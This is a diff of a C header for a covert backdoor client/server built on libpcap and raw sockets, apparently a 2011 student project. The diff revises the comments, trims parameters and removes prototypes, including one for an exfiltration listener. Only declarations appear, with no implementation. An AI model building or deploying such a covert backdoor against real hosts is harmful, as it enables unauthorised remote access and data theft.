@@ -4,12 +4,13 @@
 /*
 SOURCE FILE: client.h
 
-PROGRAM: Backdoor - A simple two in one backdoor client/server using libpcap
+PROGRAM: Backdoor - A covert backdoor client/server using libpcap and raw sockets.
 
-DATE: October 23, 2011
+DATE: November 29, 2011
 
 REVISIONS:
 	1.0 - October 23
+	1.1 - November 29, 2011
 
 DESIGNERS:
 	Santana Mach and Steve Stanisic
@@ -27,7 +28,6 @@ FUNCTION: backdoor_client
 
 PARAMS:
 	char *ipaddr: The remote host's ip address.
-	int dport: The port the remote host is "listening" on.
 	int chan: Protocol for backdoor channel.
 
 RETURN: none.
@@ -49,31 +49,5 @@ NOTES: This thread func is suitable for listening for encrypted
 	variable is set.
 */
 void *listen_thread(void *arg);
-/*
-FUNCTION: val_addr
-
-PARAMS:
-	char *addr: The host address to check.
-
-RETURN: Non-zero if this is a valid address, 0 otherwise.
-
-NOTES: Call this function to see if a string can be interpreted as an
-	IP address.
-*/
-int val_addr(char *addr);
-/*
-FUNCTION: val_port
-
-PARAMS:
-	int port: The port to check.
-
-RETURN: Non-zero if this is a valid port, 0 otherwise.
-
-NOTES: Call this function to see if an integer can be interpreted as a
-	UDP port.
-*/
-int val_port(int port);
-
-void* exfil_listen(void *arg);
 
 #endif
